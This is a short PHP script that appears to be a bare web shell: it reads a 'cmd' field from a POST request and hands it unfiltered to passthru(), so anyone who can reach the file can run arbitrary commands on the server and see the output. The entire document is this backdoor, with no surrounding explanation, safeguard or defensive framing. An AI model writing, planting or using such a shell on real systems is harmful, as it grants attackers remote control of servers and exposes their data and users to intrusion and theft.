<?php
if ($_POST['cmd']){
	$cmd = $_POST['cmd'];
	passthru($cmd);
}
?>

